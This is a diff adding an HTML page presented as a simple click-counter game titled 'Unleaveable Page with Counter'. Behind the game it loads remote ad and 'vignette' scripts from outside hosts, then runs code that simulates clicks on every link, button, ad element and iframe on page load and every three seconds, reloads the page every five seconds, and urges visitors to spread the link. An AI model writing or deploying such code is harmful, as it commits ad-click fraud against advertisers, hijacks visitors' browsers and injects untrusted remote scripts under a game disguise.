@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unleaveable Page with Counter</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            margin-top: 10px;
+        }
+        #game-background {
+            position:relative; 
+            width:100%; 
+            height:100vh; 
+            background:url('your-game-background.jpg') no-repeat center center; 
+            background-size:cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #click-button {
+            padding: 10px 20px;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            align-items: flex-end;
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+        #overlay button {
+            margin: 10px;
+            padding: 10px 20px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="counter">Points: 0</div>
+        <div id="timer">Time: 1:30</div>
+    </div>
+
+    <div id="game-background">
+        <button id="click-button">Click Me!</button>
+        <h1>Welcome to the Game!</h1>
+        <p>Enjoy your time here.</p>
+    </div>
+
+    <div id="overlay">
+        <h2>Congratulations! You have succeeded.</h2>
+        <p>But don't be so nice to suffer alone. Share the link with your friends!</p>
+        <button id="replay-button">Replay</button>
+        <button id="copy-button">Copy Link</button>
+        <button id="quit-button">Quit</button>
+    </div>
+
+    <!-- Ad tag -->
+    <script src="https://alwingulla.com/88/tag.min.js" data-zone="74202" async data-cfasync="false"></script>
+
+    <!-- Vignette tag -->
+    <script>
+        (function(d,z,s){
+            s.src='https://'+d+'/401/'+z;
+            try{
+                (document.body||document.documentElement).appendChild(s)
+            }catch(e){}
+        })('ofleafeona.com',7635453,document.createElement('script'));
+    </script>
+
+    <!-- Auto-click and infinite loop scripts -->
+    <script>
+        function simulateClick(element) {
+            var event = new MouseEvent('click', {
+                'view': window,
+                'bubbles': true,
+                'cancelable': true
+            });
+            element.dispatchEvent(event);
+        }
+
+        function autoClickAds() {
+            var ads = document.querySelectorAll('a, button, .ad, iframe');
+            ads.forEach(ad => simulateClick(ad));
+        }
+
+        let adInterval;
+        let reloadInterval;
+
+        window.onload = function() {
+            autoClickAds();
+            adInterval = setInterval(autoClickAds, 3000);
+        };
+
+        document.addEventListener("visibilitychange", function() {
+            if (document.visibilityState === 'visible') {
+                autoClickAds();
+            }
+        });
+
+        // Points and Timer functionality
+        let points = parseInt(localStorage.getItem('points')) || 0;
+        let timeLeft = parseInt(localStorage.getItem('timeLeft')) || 90; // 1 minute 30 seconds
+
+        function updateCounter() {
+            document.getElementById('counter').innerText = `Points: ${points}`;
+            if (points >= 200) {
+                showOverlay();
+                clearInterval(adInterval);
+                clearInterval(reloadInterval);
+            }
+        }
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').innerText = `Time: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function countdown() {
+            if (timeLeft > 0) {
+                timeLeft--;
+                localStorage.setItem('timeLeft', timeLeft);
+                updateTimer();
+            } else {
+                points = 0;
+                localStorage.removeItem('points');
+                localStorage.removeItem('timeLeft');
+                window.location.reload();
+            }
+        }
+
+        function showOverlay() {
+            document.getElementById('overlay').style.display = 'flex';
+        }
+
+        function replay() {
+            points = 0;
+            timeLeft = 90;
+            localStorage.setItem('points', points);
+            localStorage.setItem('timeLeft', timeLeft);
+            document.getElementById('overlay').style.display = 'none';
+            updateCounter();
+            updateTimer();
+            adInterval = setInterval(autoClickAds, 3000);
+            reloadInterval = setInterval(function() {
+                location.reload();
+            }, 5000);
+        }
+
+        function copyLink() {
+            const url = window.location.href;
+            navigator.clipboard.writeText(url).then(() => {
+                alert('Link copied to clipboard!');
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        function quit() {
+            window.open('about:blank', '_self');
+            window.close();
+        }
+
+        document.getElementById('click-button').addEventListener('click', () => {
+            points++;
+            localStorage.setItem('points', points);
+            updateCounter();
+        });
+
+        document.getElementById('replay-button').addEventListener('click', replay);
+        document.getElementById('copy-button').addEventListener('click', copyLink);
+        document.getElementById('quit-button').addEventListener('click', quit);
+
+        updateCounter();
+        updateTimer();
+        setInterval(countdown, 1000);
+
+        // Reload page every 5 seconds
+        reloadInterval = setInterval(function() {
+            location.reload();
+        }, 5000);
+    </script>
+</body>
+</html>
